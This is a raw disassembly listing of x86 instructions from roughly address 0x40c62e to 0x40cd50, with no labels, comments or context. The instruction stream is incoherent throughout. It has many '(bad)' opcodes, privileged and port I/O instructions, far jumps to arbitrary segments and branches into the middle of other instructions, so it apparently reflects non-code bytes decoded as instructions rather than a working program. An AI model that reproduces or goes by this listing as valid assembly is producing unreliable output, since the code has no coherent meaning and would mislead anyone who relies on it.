  40c62e:	xor    al,0x2b
  40c630:	jecxz  0x40c618
  40c632:	bound  esp,QWORD PTR [edi+0x25]
  40c635:	cmp    dh,cl
  40c637:	xchg   DWORD PTR ds:0x6630cab7,edx
  40c63d:	dec    edi
  40c63e:	imul   ebx,DWORD PTR [edx-0x2cde593c],0x77
  40c645:	sub    esi,DWORD PTR [ebp-0xa]
  40c648:	scas   eax,DWORD PTR es:[edi]
  40c649:	add    al,0x5d
  40c64b:	ins    BYTE PTR es:[edi],dx
  40c64c:	add    ecx,DWORD PTR ds:0xdb4074d7
  40c652:	mov    bl,0x57
  40c654:	xchg   BYTE PTR [edi-0x24],al
  40c657:	outs   dx,DWORD PTR ds:[esi]
  40c658:	add    DWORD PTR [esi],ecx
  40c65a:	jge    0x40c645
  40c65c:	aas    
  40c65d:	lock jae 0x40c66d
  40c660:	stos   BYTE PTR es:[edi],al
  40c661:	add    bh,0x6c
  40c664:	popf   
  40c665:	ins    DWORD PTR es:[edi],dx
  40c666:	inc    ecx
  40c667:	leave  
  40c668:	or     edx,esp
  40c66a:	(bad)  
  40c66b:	stos   DWORD PTR es:[edi],eax
  40c66c:	dec    ebp
  40c66d:	dec    ecx
  40c66e:	mov    cl,0xf7
  40c670:	mov    edi,0x26f74f56
  40c675:	lds    esi,FWORD PTR [esi-0x5ddbeb96]
  40c67b:	nop
  40c67c:	adc    edx,DWORD PTR [esi]
  40c67e:	xor    DWORD PTR [esi],0xffffffce
  40c681:	mov    ch,0xad
  40c683:	adc    ah,BYTE PTR ds:0x278efeda
  40c689:	push   cs
  40c68a:	rcr    BYTE PTR [edi+0x4e40c06e],1
  40c690:	bound  esi,QWORD PTR [edi+esi*4]
  40c693:	mov    ah,0x2b
  40c695:	(bad)  
  40c696:	into   
  40c697:	mov    ebp,0xac580877
  40c69c:	int3   
  40c69d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c69e:	sbb    BYTE PTR [ebp-0x22],bh
  40c6a1:	or     dh,BYTE PTR [edi-0x3f5465af]
  40c6a7:	xchg   ecx,eax
  40c6a8:	mov    ?,WORD PTR [eiz*8-0x1f6eb14d]
  40c6af:	out    0x34,eax
  40c6b1:	add    BYTE PTR [edi],ch
  40c6b3:	push   0x14
  40c6b5:	mov    edx,0xae3036e0
  40c6ba:	stos   DWORD PTR es:[edi],eax
  40c6bb:	cld    
  40c6bc:	pop    ebp
  40c6bd:	js     0x40c682
  40c6bf:	aam    0x7d
  40c6c1:	inc    ebp
  40c6c2:	dec    eax
  40c6c3:	lock xchg esi,eax
  40c6c5:	sbb    dh,dl
  40c6c7:	in     eax,dx
  40c6c8:	pop    esp
  40c6c9:	mov    ds:0x32ec9940,al
  40c6ce:	es push cs
  40c6d0:	mov    edi,0x559616f8
  40c6d5:	xor    al,0x69
  40c6d7:	jg     0x40c722
  40c6d9:	pushf  
  40c6da:	inc    esi
  40c6db:	daa    
  40c6dc:	pop    esp
  40c6dd:	push   DWORD PTR [edi+0x673032e6]
  40c6e3:	push   ss
  40c6e4:	inc    ebp
  40c6e5:	inc    ebx
  40c6e6:	pop    ds
  40c6e7:	or     DWORD PTR [edi-0xa],0x5f030a61
  40c6ee:	or     bl,BYTE PTR [edi+0x63]
  40c6f1:	in     al,0x25
  40c6f3:	lods   al,BYTE PTR ds:[esi]
  40c6f4:	pop    edx
  40c6f5:	adc    edx,edx
  40c6f7:	adc    ebp,eax
  40c6f9:	adc    eax,0x3ce09204
  40c6fe:	jno    0x40c75f
  40c700:	add    ebx,0xffffffcb
  40c703:	mov    ds:0xa29afd34,eax
  40c708:	leave  
  40c709:	loope  0x40c6f5
  40c70b:	int3   
  40c70c:	stos   BYTE PTR es:[edi],al
  40c70d:	inc    edi
  40c70e:	push   esp
  40c70f:	je     0x40c77c
  40c711:	mov    al,0xd6
  40c713:	cwde   
  40c714:	test   BYTE PTR [edi],dh
  40c716:	dec    eax
  40c717:	xchg   ebp,eax
  40c718:	or     bl,BYTE PTR [esi*8-0x317940c4]
  40c71f:	and    eax,0xad02c128
  40c724:	dec    esp
  40c725:	adc    eax,DWORD PTR [ebx]
  40c727:	popa   
  40c728:	inc    ecx
  40c729:	mov    dl,0x60
  40c72b:	popa   
  40c72c:	pop    es
  40c72d:	inc    esp
  40c72e:	retf   
  40c72f:	xchg   DWORD PTR [eax-0x76d289cf],esi
  40c735:	push   ebx
  40c736:	cld    
  40c737:	inc    BYTE PTR [eax+0x5]
  40c73a:	mov    ebp,0x858fabfc
  40c73f:	mov    ebp,0xf5519d5b
  40c744:	and    DWORD PTR [ecx+ecx*8-0x28],edi
  40c748:	mov    ah,al
  40c74a:	lahf   
  40c74b:	or     BYTE PTR [edx],ch
  40c74d:	xchg   ecx,esi
  40c74f:	dec    esi
  40c750:	mov    edx,0x27ab503b
  40c755:	push   eax
  40c756:	das    
  40c757:	rcl    DWORD PTR [esi+ecx*8],cl
  40c75a:	fiadd  WORD PTR [edi+0x36]
  40c75d:	add    al,0xdd
  40c75f:	das    
  40c760:	int3   
  40c761:	out    0x3f,eax
  40c763:	sbb    ah,BYTE PTR [ecx+0x4a]
  40c766:	cs pop edx
  40c768:	lgs    esp,FWORD PTR [edx-0xf]
  40c76c:	pop    esi
  40c76d:	jae    0x40c705
  40c76f:	fwait
  40c770:	(bad)  
  40c771:	jb     0x40c7a4
  40c773:	imul   eax,DWORD PTR [edx+0x7ad55175],0xffffffa5
  40c77a:	cmp    eax,0xdd94f7bb
  40c77f:	addr16 enter 0xda0,0x6c
  40c784:	mov    esp,0xf39d61e4
  40c789:	cmp    eax,0x52a6b297
  40c78e:	jle    0x40c714
  40c790:	out    dx,eax
  40c791:	shl    BYTE PTR [edi],cl
  40c793:	adc    cl,BYTE PTR ds:0xefb4a471
  40c799:	jl     0x40c77d
  40c79b:	pop    ebp
  40c79c:	icebp  
  40c79d:	(bad)  
  40c79e:	lods   al,BYTE PTR ds:[si]
  40c7a0:	ins    BYTE PTR es:[edi],dx
  40c7a1:	xchg   ecx,eax
  40c7a2:	mov    WORD PTR [edi-0x7d97cf80],gs
  40c7a8:	sbb    BYTE PTR [eax+eiz*8+0x3d],ch
  40c7ac:	dec    edx
  40c7ad:	jbe    0x40c7f7
  40c7af:	cs xor al,0x84
  40c7b2:	enter  0x2557,0x60
  40c7b6:	pop    ebx
  40c7b7:	pop    edi
  40c7b8:	mov    edi,0x6a38f552
  40c7bd:	loopne 0x40c7dd
  40c7bf:	push   eax
  40c7c0:	cmc    
  40c7c1:	pop    ds
  40c7c2:	mov    ah,0x8a
  40c7c4:	pop    es
  40c7c5:	adc    esp,ebx
  40c7c7:	xor    edi,edx
  40c7c9:	mov    ebp,0xf9f048eb
  40c7ce:	mov    al,ds:0x36595269
  40c7d3:	cmp    BYTE PTR [edx+0x222478e7],bh
  40c7d9:	lods   al,BYTE PTR ds:[esi]
  40c7da:	jmp    0x60b85da8
  40c7df:	pop    ebx
  40c7e0:	call   0xa441:0xd1db4d6
  40c7e7:	dec    ecx
  40c7e8:	mov    ebp,0xf2d9cfe4
  40c7ed:	setno  BYTE PTR ds:[eax-0x29]
  40c7f2:	aam    0x8c
  40c7f4:	ins    DWORD PTR es:[edi],dx
  40c7f5:	nop
  40c7f6:	fwait
  40c7f7:	mov    al,ds:0xbc9d17c8
  40c7fc:	cld    
  40c7fd:	scas   eax,DWORD PTR es:[edi]
  40c7fe:	dec    esi
  40c7ff:	mov    ds:0x9ac071a7,al
  40c804:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c805:	xchg   ebp,eax
  40c806:	jg     0x40c7c7
  40c808:	xchg   al,al
  40c80a:	xchg   edi,eax
  40c80b:	mov    esi,0x281b868a
  40c810:	xchg   esi,eax
  40c811:	ret    0xe423
  40c814:	sti    
  40c815:	imul   esp,DWORD PTR [edx],0xffffff84
  40c818:	outs   dx,BYTE PTR ds:[esi]
  40c819:	aad    0x16
  40c81b:	push   cs
  40c81c:	jmp    0x807afcbb
  40c821:	jnp    0x40c7e3
  40c823:	and    bh,BYTE PTR [ecx+edx*1]
  40c826:	sub    esp,DWORD PTR [ecx+0x5]
  40c829:	mul    BYTE PTR [eax+0x17]
  40c82c:	xchg   edx,eax
  40c82d:	push   esp
  40c82e:	out    dx,al
  40c82f:	jmp    0xf1f81ec7
  40c834:	test   edi,ecx
  40c836:	aad    0xb7
  40c838:	fcmovnu st,st(7)
  40c83a:	addr16 ret 
  40c83c:	inc    eax
  40c83d:	add    DWORD PTR [edi-0x6b],esp
  40c840:	xchg   esp,eax
  40c842:	inc    esp
  40c843:	jge    0x40c84e
  40c845:	test   BYTE PTR ds:0x7bc098bb,bh
  40c84b:	loope  0x40c81b
  40c84d:	retf   0x3bb3
  40c850:	test   al,0x5f
  40c852:	or     al,0xa4
  40c854:	mov    ah,0x24
  40c856:	or     cl,BYTE PTR [edi+0x55008ae9]
  40c85c:	loopne 0x40c83a
  40c85e:	pop    ebx
  40c85f:	out    dx,al
  40c860:	sti    
  40c861:	mov    bl,0x60
  40c863:	sbb    al,0xe6
  40c865:	push   ss
  40c866:	jmp    0x8df1939e
  40c86b:	xchg   ebp,eax
  40c86c:	xor    esi,DWORD PTR [edi-0x56]
  40c86f:	xor    eax,0x72640fb4
  40c874:	fcom   DWORD PTR [edi+0x1e]
  40c877:	lds    edx,FWORD PTR [ebx]
  40c879:	inc    esi
  40c87a:	mov    ebx,0xc630510b
  40c87f:	cmp    eax,0x748375
  40c884:	mov    cs,WORD PTR [esi]
  40c886:	sbb    DWORD PTR gs:[ebp-0x7d13209e],esp
  40c88d:	pop    ds
  40c88e:	imul   ebx,DWORD PTR [ebp-0x56102a0],0x7a5d1b41
  40c898:	lods   al,BYTE PTR ds:[esi]
  40c899:	pop    ebp
  40c89a:	xchg   edi,eax
  40c89b:	xchg   ecx,eax
  40c89c:	push   es
  40c89d:	pusha  
  40c89e:	cdq    
  40c89f:	mov    eax,0xc74cfe0c
  40c8a4:	out    0xae,eax
  40c8a6:	cdq    
  40c8a7:	push   esi
  40c8a8:	and    DWORD PTR [ebp+0x55c56ff7],ebx
  40c8ae:	mov    ch,0x80
  40c8b0:	dec    edi
  40c8b1:	jnp    0x40c8ec
  40c8b3:	sub    al,0x8f
  40c8b5:	mov    DWORD PTR [eax],ebx
  40c8b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c8b8:	pop    ecx
  40c8b9:	lods   eax,DWORD PTR ds:[esi]
  40c8ba:	mov    bh,0x2a
  40c8bc:	sub    eax,0x6519e6be
  40c8c1:	loope  0x40c8fb
  40c8c3:	push   ecx
  40c8c4:	mul    DWORD PTR [ecx]
  40c8c6:	fisub  WORD PTR [ecx+0x4dbc05e1]
  40c8cc:	pop    eax
  40c8cd:	rcl    DWORD PTR [edx],1
  40c8cf:	lahf   
  40c8d0:	dec    eax
  40c8d1:	or     ebx,DWORD PTR [ebx]
  40c8d3:	cmp    ecx,DWORD PTR [edi]
  40c8d5:	add    ah,cl
  40c8d7:	xchg   ecx,eax
  40c8d8:	inc    ebx
  40c8d9:	xor    eax,0x954ae592
  40c8de:	nop
  40c8df:	xchg   edx,eax
  40c8e0:	aaa    
  40c8e1:	push   ss
  40c8e2:	cli    
  40c8e3:	inc    ecx
  40c8e4:	das    
  40c8e5:	inc    edi
  40c8e6:	fcomp  QWORD PTR [eax]
  40c8e8:	push   ebx
  40c8e9:	sbb    dh,BYTE PTR [ecx+0x2e4a7a44]
  40c8ef:	push   ecx
  40c8f0:	sub    edx,esp
  40c8f2:	sub    al,BYTE PTR [eax+0x44]
  40c8f5:	push   ebp
  40c8f6:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8f8:	xchg   edi,eax
  40c8f9:	repz mov esi,0xbcb0b61b
  40c8ff:	dec    esi
  40c900:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c901:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c902:	inc    esi
  40c903:	xor    BYTE PTR [ebx-0x3b],bh
  40c906:	outs   dx,BYTE PTR ds:[esi]
  40c907:	mov    ?,WORD PTR [edx-0x6b54ea73]
  40c90d:	mov    dh,0x8d
  40c90f:	in     eax,0xb7
  40c911:	mov    ebp,0x2fa56720
  40c916:	xor    ebx,DWORD PTR ds:0xb7eb535
  40c91c:	int3   
  40c91d:	retf   
  40c91e:	or     DWORD PTR [eax],edx
  40c920:	ret    0xb614
  40c923:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c924:	pushf  
  40c925:	dec    esp
  40c926:	clc    
  40c927:	fidivr DWORD PTR ds:0xfea13ed0
  40c92d:	inc    eax
  40c92e:	xchg   BYTE PTR [eax-0x40],bh
  40c931:	add    ebp,DWORD PTR [esi+0x1ae6dfd7]
  40c937:	inc    esi
  40c938:	imul   esp,DWORD PTR [ebx-0x2c],0x17de09e
  40c93f:	popf   
  40c940:	(bad)
  40c944:	(bad)  
  40c946:	lahf   
  40c947:	aas    
  40c948:	(bad)  
  40c94a:	fst    DWORD PTR [edi-0x4]
  40c94d:	jg     0x40c8ef
  40c94f:	aam    0x40
  40c951:	fidivr DWORD PTR [edx+0x7]
  40c954:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c955:	pusha  
  40c956:	and    al,0x7d
  40c958:	verr   WORD PTR [ebp+0x67]
  40c95c:	inc    ebx
  40c95d:	jnp    0x40c99d
  40c95f:	pxor   mm6,QWORD PTR [eax-0x6ff16c0a]
  40c966:	mov    ds:0xf7f9bc8b,al
  40c96b:	add    eax,0x6b1635b4
  40c970:	xchg   eax,ecx
  40c972:	xor    BYTE PTR [ebp+0x7d],0x22
  40c976:	pop    edi
  40c977:	pop    ds
  40c978:	add    bh,BYTE PTR [ebp+0x32]
  40c97b:	xchg   BYTE PTR [edi+0x7],ah
  40c97e:	repnz sub al,BYTE PTR [ecx+0x5a]
  40c982:	mov    ebx,0x47c36590
  40c987:	jmp    0x3879c593
  40c98c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c98d:	icebp  
  40c98e:	jbe    0x40c9bc
  40c990:	and    DWORD PTR fs:[edx+0x7bcff31],esi
  40c997:	mul    DWORD PTR [ebx+0x56]
  40c99a:	mov    ecx,0xf4163c2c
  40c99f:	jge    0x40c964
  40c9a1:	mov    bh,0x13
  40c9a3:	mov    dl,0x78
  40c9a5:	scas   eax,DWORD PTR es:[edi]
  40c9a6:	pop    fs
  40c9a8:	add    eax,0x740a1041
  40c9ad:	xchg   ebp,eax
  40c9ae:	and    BYTE PTR [eax+edx*2+0xc4ef322],ah
  40c9b5:	mov    cl,0x6f
  40c9b7:	repz xchg ecx,eax
  40c9b9:	jl     0x40c9ec
  40c9bb:	push   0x94ebe7f2
  40c9c0:	ds sahf 
  40c9c2:	push   eax
  40c9c3:	retf   
  40c9c4:	mov    eax,ds:0x17f8bdfa
  40c9c9:	addr16 sti 
  40c9cb:	jecxz  0x40c9e8
  40c9cd:	sbb    DWORD PTR [eax+ebp*8-0x357e506],ecx
  40c9d4:	addr16 (bad) 
  40c9d6:	stos   BYTE PTR es:[edi],al
  40c9d7:	test   al,0xe9
  40c9d9:	div    DWORD PTR [ebx+0x44]
  40c9dc:	mov    edx,0xe67a8004
  40c9e1:	xabort 0xd4
  40c9e4:	sub    al,0x56
  40c9e6:	xor    al,0x3f
  40c9e8:	mov    edx,DWORD PTR [ecx-0x2cc95d35]
  40c9ee:	test   eax,0xb774eafd
  40c9f3:	xor    ecx,ebp
  40c9f5:	icebp  
  40c9f6:	xchg   DWORD PTR [ebx-0x15],ebx
  40c9f9:	dec    eax
  40c9fa:	jge    0x40c9f3
  40c9fc:	adc    al,0x7b
  40c9fe:	pop    ecx
  40c9ff:	fwait
  40ca00:	xchg   BYTE PTR [eax],bl
  40ca02:	fisttp DWORD PTR [edi-0x3043df29]
  40ca08:	push   ebp
  40ca09:	mov    ch,0xd3
  40ca0b:	(bad)  
  40ca0c:	xor    DWORD PTR [ecx+0xb51f526],edx
  40ca12:	pop    esp
  40ca13:	inc    esi
  40ca14:	cmc    
  40ca15:	mov    eax,ds:0xf7cecd25
  40ca1a:	mov    ds:0x583a3a80,eax
  40ca1f:	test   BYTE PTR [edx+0x6b],al
  40ca22:	mov    ds:0x5bdab4d6,al
  40ca27:	mov    cl,0xef
  40ca29:	mov    bl,0x88
  40ca2b:	sub    DWORD PTR [ecx+ebx*1-0x3e],eax
  40ca2f:	mov    bh,0x76
  40ca31:	push   ds
  40ca32:	inc    edx
  40ca33:	add    al,0xcb
  40ca35:	and    dh,BYTE PTR [esi+0x7d759950]
  40ca3b:	aas    
  40ca3c:	xor    eax,0x561f3d92
  40ca41:	ins    BYTE PTR es:[edi],dx
  40ca42:	(bad)  [eax+0x26]
  40ca45:	and    dl,ch
  40ca47:	aam    0x48
  40ca49:	lahf   
  40ca4a:	test   BYTE PTR [eax+edi*1-0x4c9373bf],dh
  40ca51:	fmulp  st(1),st
  40ca53:	std    
  40ca54:	pop    ebx
  40ca55:	mov    eax,ds:0xbee84bd0
  40ca5a:	jge    0x40ca58
  40ca5c:	cmp    dh,ah
  40ca5e:	mov    bl,0x86
  40ca60:	or     al,0x90
  40ca62:	hlt    
  40ca63:	adc    ah,BYTE PTR [edx+0x1]
  40ca66:	popa   
  40ca67:	mov    BYTE PTR [ecx-0x283917dc],dl
  40ca6d:	ins    DWORD PTR es:[edi],dx
  40ca6e:	(bad)  
  40ca6f:	mov    esp,0x37970bc3
  40ca74:	pop    ss
  40ca75:	xchg   ebx,eax
  40ca76:	(bad)  
  40ca77:	shl    BYTE PTR [esp+edx*8+0x7c2d7b6c],1
  40ca7e:	sar    BYTE PTR [edi+0x49],1
  40ca81:	mov    edx,0x66dbeb55
  40ca86:	jo     0x40ca1b
  40ca88:	int3   
  40ca89:	in     al,0x3b
  40ca8b:	xchg   DWORD PTR [ecx-0x6e1b13f3],ebx
  40ca91:	(bad)  
  40ca92:	jp     0x40ca48
  40ca94:	cmp    BYTE PTR [ebp+0x169fc3c5],ch
  40ca9a:	mov    eax,ds:0xf52497b9
  40ca9f:	(bad)  
  40caa0:	push   0x6e
  40caa2:	dec    esi
  40caa3:	xchg   esp,eax
  40caa4:	mov    bh,0xde
  40caa6:	sub    eax,0x4b5db193
  40caab:	xor    esi,esi
  40caad:	adc    esi,DWORD PTR [ebp-0x7e]
  40cab0:	rol    esi,cl
  40cab2:	pop    ebp
  40cab3:	mov    bh,0xcf
  40cab5:	data16 jecxz 0x40ca48
  40cab8:	xchg   ebx,eax
  40cab9:	sub    BYTE PTR [ecx-0x37895998],dl
  40cabf:	pop    ecx
  40cac0:	repz leave 
  40cac2:	dec    esp
  40cac3:	or     DWORD PTR [ecx],ebp
  40cac5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cac6:	retf   0x91e9
  40cac9:	jmp    0xc7ff:0x9b10081
  40cad0:	or     esp,DWORD PTR [eax]
  40cad2:	neg    ah
  40cad4:	leave  
  40cad5:	push   edi
  40cad6:	xor    eax,0x31c5b41c
  40cadb:	mov    bh,0xc2
  40cadd:	sbb    al,0x6a
  40cadf:	xchg   ebx,eax
  40cae0:	ins    BYTE PTR es:[edi],dx
  40cae1:	jnp    0x40cade
  40cae3:	and    al,0xd7
  40cae5:	sub    eax,0x2655d855
  40caea:	(bad)  
  40caeb:	bound  ebx,QWORD PTR gs:[edx-0x7d]
  40caef:	xchg   edx,esp
  40caf1:	pop    esp
  40caf2:	push   eax
  40caf3:	add    BYTE PTR [ebx-0x51adf0a2],bl
  40caf9:	dec    eax
  40cafa:	daa    
  40cafb:	popf   
  40cafc:	jns    0x40ca80
  40cafe:	vprotb ymm6,[eax+0x7e1cf32a],xmm2
  40cb07:	nop
  40cb08:	dec    eax
  40cb09:	add    ebx,DWORD PTR [esi-0x6d]
  40cb0c:	add    dh,ah
  40cb0e:	push   0xffffffde
  40cb10:	push   esi
  40cb11:	mov    ecx,0xa1d73dd5
  40cb16:	add    eax,0x881d2830
  40cb1b:	repnz dec esi
  40cb1d:	repnz pop ebx
  40cb1f:	cs loope 0x40cad0
  40cb22:	ret    
  40cb23:	xor    BYTE PTR [eax-0x42],0xce
  40cb27:	data16 cld 
  40cb29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb2a:	rdmsr  
  40cb2c:	or     ah,BYTE PTR [edx]
  40cb2e:	push   si
  40cb30:	pop    ebp
  40cb31:	call   0x43c9:0x24439f1a
  40cb38:	mov    cl,0x6e
  40cb3a:	scas   eax,DWORD PTR es:[edi]
  40cb3b:	xor    eax,0x74e9ec26
  40cb40:	(bad)  
  40cb41:	jmp    0xe84b:0x96d9d1b8
  40cb48:	or     ah,BYTE PTR [ebx+edi*8-0x3d807d06]
  40cb4f:	fs jae 0x40cb0a
  40cb52:	add    edx,esp
  40cb54:	add    DWORD PTR [ebp+0x56c82173],ecx
  40cb5a:	adc    dh,al
  40cb5c:	sbb    cl,cl
  40cb5e:	jmp    0xb62a:0x847e7a00
  40cb65:	pop    esi
  40cb66:	(bad)  
  40cb67:	fnsave [ecx+0x22]
  40cb6a:	out    0x59,al
  40cb6c:	mov    eax,ds:0x343f742e
  40cb71:	es ins BYTE PTR es:[edi],dx
  40cb73:	pusha  
  40cb74:	mov    ah,0x17
  40cb76:	mov    dl,0x8c
  40cb78:	add    ch,al
  40cb7a:	daa    
  40cb7b:	push   ds
  40cb7c:	xor    eax,0x5f48133f
  40cb81:	hlt    
  40cb82:	mov    eax,ds:0x8cc9f8c3
  40cb87:	xor    ebp,edx
  40cb89:	ss out dx,eax
  40cb8b:	imul   ebp,DWORD PTR [ebp-0x683ffd61],0x63
  40cb92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb93:	lea    ebx,[eax+0x46]
  40cb96:	mov    ebp,0x5d9d807f
  40cb9b:	(bad)  
  40cb9c:	fbstp  TBYTE PTR [ebx+0x24b37003]
  40cba2:	or     eax,0x29a2a690
  40cba7:	fst    DWORD PTR [eax+0xe]
  40cbaa:	add    al,0x1
  40cbac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cbad:	cld    
  40cbae:	or     eax,0xb44c4f86
  40cbb3:	fldenv [ecx+ebx*4]
  40cbb6:	mov    BYTE PTR [edx-0x63],al
  40cbb9:	psrlq  mm0,QWORD PTR [eax+esi*8-0x7f6eb9b7]
  40cbc1:	fwait
  40cbc2:	icebp  
  40cbc3:	jg     0x40cbe4
  40cbc5:	mov    eax,0x6fcc03c6
  40cbca:	jno    0x40cbb7
  40cbcc:	aaa    
  40cbcd:	cmp    al,0x74
  40cbcf:	dec    edi
  40cbd0:	shr    BYTE PTR [ebx],cl
  40cbd2:	push   edx
  40cbd3:	lock jmp 0x40cbd8
  40cbd6:	bound  esp,QWORD PTR [ebx+0x2f]
  40cbd9:	mov    ebx,0x32550506
  40cbde:	fnsave [edi+eiz*2+0x6c]
  40cbe2:	adc    ch,BYTE PTR [edi-0x56]
  40cbe5:	pop    ecx
  40cbe6:	inc    eax
  40cbe7:	fisttp QWORD PTR [ebx+0x21dbb1e5]
  40cbed:	dec    eax
  40cbee:	and    al,BYTE PTR [esi-0x6d9cc4b7]
  40cbf4:	mov    al,0x5
  40cbf6:	jbe    0x40cc28
  40cbf8:	ficomp WORD PTR [ebx]
  40cbfa:	and    DWORD PTR [edi],ebp
  40cbfc:	fs jg  0x40cbe7
  40cbff:	inc    ebx
  40cc00:	jl     0x40cbdc
  40cc02:	jp     0x40cc44
  40cc04:	sub    DWORD PTR [edx],edi
  40cc06:	cwde   
  40cc07:	xchg   edi,eax
  40cc08:	pop    esi
  40cc09:	mov    eax,ds:0xd900e0f7
  40cc0e:	xchg   esp,eax
  40cc0f:	cmp    al,0xa6
  40cc11:	cmp    BYTE PTR [ecx+0x55],cl
  40cc14:	aas    
  40cc15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc16:	pop    ebx
  40cc17:	and    DWORD PTR [edi-0x70],ebx
  40cc1a:	xchg   ebp,eax
  40cc1b:	dec    edi
  40cc1c:	stos   BYTE PTR es:[edi],al
  40cc1d:	test   BYTE PTR [ebx-0x26],al
  40cc20:	imul   ebp,DWORD PTR [eax+0x53],0x43
  40cc24:	outs   dx,DWORD PTR ds:[esi]
  40cc25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc26:	pusha  
  40cc27:	and    bl,BYTE PTR [ebp+ecx*1+0x10c0398]
  40cc2e:	mov    ebp,ds
  40cc30:	sub    eax,0xc51d71f8
  40cc35:	test   eax,0x8d870f2c
  40cc3a:	ror    cl,0xde
  40cc3d:	(bad)  
  40cc3e:	push   edi
  40cc3f:	jp     0x40cc82
  40cc41:	ret    
  40cc42:	inc    ebp
  40cc43:	sbb    DWORD PTR ds:0xece19a17,ebx
  40cc49:	dec    ebp
  40cc4a:	sar    DWORD PTR [eax+ecx*4],cl
  40cc4d:	add    bh,BYTE PTR [edx-0x4d16e224]
  40cc53:	inc    esi
  40cc54:	aas    
  40cc55:	cmp    BYTE PTR ds:0x94553192,dl
  40cc5b:	cmp    dl,BYTE PTR [esi]
  40cc5d:	xchg   esi,eax
  40cc5e:	push   ebp
  40cc5f:	fimul  DWORD PTR [eax]
  40cc61:	jp     0x40cc40
  40cc63:	outs   dx,DWORD PTR ds:[esi]
  40cc64:	in     al,dx
  40cc65:	(bad)  
  40cc66:	scas   al,BYTE PTR es:[edi]
  40cc67:	dec    esi
  40cc68:	(bad)  
  40cc69:	das    
  40cc6a:	xchg   esp,eax
  40cc6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc6c:	xor    ch,ah
  40cc6e:	inc    ebp
  40cc6f:	loope  0x40cbfb
  40cc71:	push   0x9d8cd3f9
  40cc76:	rcl    esp,cl
  40cc78:	jno    0x40ccf9
  40cc7a:	adc    BYTE PTR [edx],bl
  40cc7c:	ror    DWORD PTR [ebx+eax*1],1
  40cc7f:	mov    es,WORD PTR [ebp+0x1abbdeba]
  40cc85:	sbb    eax,0x68c2e36f
  40cc8a:	sbb    DWORD PTR [ebp-0x10293f52],edi
  40cc90:	std    
  40cc91:	out    0x3d,eax
  40cc93:	test   al,0x6d
  40cc95:	mov    esp,0x5c71a4d4
  40cc9a:	add    edx,ebx
  40cc9c:	icebp  
  40cc9d:	cwde   
  40cc9e:	push   ebx
  40cc9f:	imul   ebp,DWORD PTR [ebp+0x57],0x604ca567
  40cca6:	mov    ebp,0x52bb2513
  40ccab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ccac:	mov    cl,0x80
  40ccae:	in     eax,0x6c
  40ccb0:	dec    esp
  40ccb1:	push   es
  40ccb2:	jmp    DWORD PTR [edi+0x6680acbf]
  40ccb8:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ccba:	push   ecx
  40ccbb:	adc    BYTE PTR [esi],0x54
  40ccbe:	scas   al,BYTE PTR es:[edi]
  40ccbf:	lds    ecx,FWORD PTR [ecx-0x6a37d3fe]
  40ccc5:	inc    BYTE PTR [esi+eax*4+0x571677e3]
  40cccc:	cmp    esp,ebx
  40ccce:	jge    0x40cc75
  40ccd0:	out    dx,eax
  40ccd1:	jno    0x40cc6c
  40ccd3:	or     dh,BYTE PTR [ebx]
  40ccd5:	xchg   ebx,eax
  40ccd6:	or     DWORD PTR [ecx-0xde66d3a],esp
  40ccdc:	iret   
  40ccdd:	dec    edx
  40ccde:	push   es
  40ccdf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cce0:	inc    ecx
  40cce1:	push   esp
  40cce2:	xor    eax,DWORD PTR [edx-0x55]
  40cce5:	retf   
  40cce6:	mov    ah,0x52
  40cce8:	les    esi,FWORD PTR [eax]
  40ccea:	inc    ebx
  40cceb:	and    BYTE PTR [ebx+edi*2+0x20],al
  40ccef:	pop    edx
  40ccf0:	inc    edx
  40ccf1:	cs in  eax,0x6f
  40ccf4:	cli    
  40ccf5:	or     dl,bh
  40ccf7:	sub    edx,esi
  40ccf9:	nop
  40ccfa:	adc    bh,dl
  40ccfc:	aaa    
  40ccfd:	fwait
  40ccfe:	mov    ebp,0x486d49a9
  40cd03:	or     esi,ebx
  40cd05:	fsubr  DWORD PTR [eax-0x20]
  40cd08:	popf   
  40cd09:	stos   BYTE PTR es:[edi],al
  40cd0a:	adc    BYTE PTR [edi],bl
  40cd0c:	lods   al,BYTE PTR ds:[esi]
  40cd0d:	jnp    0x40cd61
  40cd0f:	ins    BYTE PTR es:[edi],dx
  40cd10:	int    0xa5
  40cd12:	xor    al,0x86
  40cd14:	cli    
  40cd15:	fld    QWORD PTR [esi]
  40cd17:	mov    eax,0xa60fc68e
  40cd1c:	xor    al,0x38
  40cd1e:	(bad)  
  40cd1f:	jg     0x40ccf2
  40cd21:	out    dx,al
  40cd22:	test   bl,bl
  40cd24:	popa   
  40cd25:	mov    BYTE PTR [ebp+0x3d],bl
  40cd28:	pop    edx
  40cd29:	dec    esp
  40cd2a:	pop    es
  40cd2b:	retf   0xa9d7
  40cd2e:	out    dx,eax
  40cd2f:	arpl   WORD PTR [esp+ebp*8],bp
  40cd32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd33:	jns    0x40cd5b
  40cd35:	inc    ecx
  40cd36:	sub    edx,0x2e
  40cd39:	leave  
  40cd3a:	jno    0x40cd63
  40cd3c:	iret   
  40cd3d:	jmp    0x1607:0xac24d2ab
  40cd44:	aam    0x3e
  40cd46:	(bad)  
  40cd47:	in     al,0xba
  40cd49:	push   0xfc895d3f
  40cd4e:	hlt    
  40cd4f:	int3   
  40cd50:	aad    0x3e
